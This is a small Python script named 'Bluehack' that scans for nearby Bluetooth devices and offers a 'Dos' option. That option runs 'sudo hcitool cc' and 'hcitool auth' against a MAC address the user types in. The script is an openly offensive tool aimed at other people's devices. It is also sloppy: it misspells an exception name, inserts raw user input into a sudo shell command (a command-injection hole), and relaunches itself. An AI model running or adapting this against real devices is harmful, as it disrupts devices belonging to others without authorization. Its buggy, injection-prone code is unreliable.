import time
import sys
import os

def banner():
    os.system("clear")
    print(""" --  |   |    |  -- |   |        ---- | /  """)
    print("""|  | |   |    | |   |   |       |     |/   """)
    print("""| -  |   |    | |-- |---|   /\  |     |\   """)
    print("""|  | |   |    | |   |   |  /--\ |     | \  """)
    print(""" --  |__  ----   -- |   | /    \ ---- |  \ """)
def opt(): # options code
   print("Scan        [ 1 ]")
   print("Dos         [ 2 ]")
   print("exit        [ 3 ]")
   opt = input("[ Bluehack ] --> ")
   if opt == "1":
       listen()
   elif opt == "2":
       send()
   else:
       sys.exit()
def listen(): # listen code
    os.system("hcitool scan")
def send(): # Dos code
    mac = input("remote mac -->")
    try:
        os.system("sudo hcitool cc {} ; sudo hcitool auth {}".format(mac, mac))
    except Eception:
        sys.exit()
time.sleep(0.5)
banner()
opt()
os.system("python3 Bluehack.py")
